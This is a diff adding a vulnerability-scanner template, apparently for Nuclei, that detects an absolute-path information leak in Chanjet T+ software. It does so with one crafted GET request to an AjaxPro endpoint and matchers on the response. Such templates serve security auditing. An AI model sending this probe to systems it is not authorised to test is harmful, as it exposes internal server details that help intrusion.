@@ -1,0 +1,30 @@
+id: changjet-tplus-AccountClearControler-disclosure
+info:
+  name: changjet tplus AccountClearControler 绝对路径敏感信息泄漏
+  author: leadlife
+  severity: medium
+  description: 
+  reference: 
+    - https://github.com/MrWQ/vulnerability-paper/blob/b60b05e87904b834ef707eaf18ca5c15eb972edf/bugs/%E7%95%85%E6%8D%B7%E9%80%9A%E6%BC%8F%E6%B4%9E%E5%A4%A7%E5%85%A8%E9%9B%86%E5%90%88.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: 
+    repair:
+    version:
+  tags: tplus,changjet,disclosure
+
+http:
+  - raw:
+      - |
+        GET /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetDefaultBackPath HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Chanjet','TPlusStd')
+        condition: and
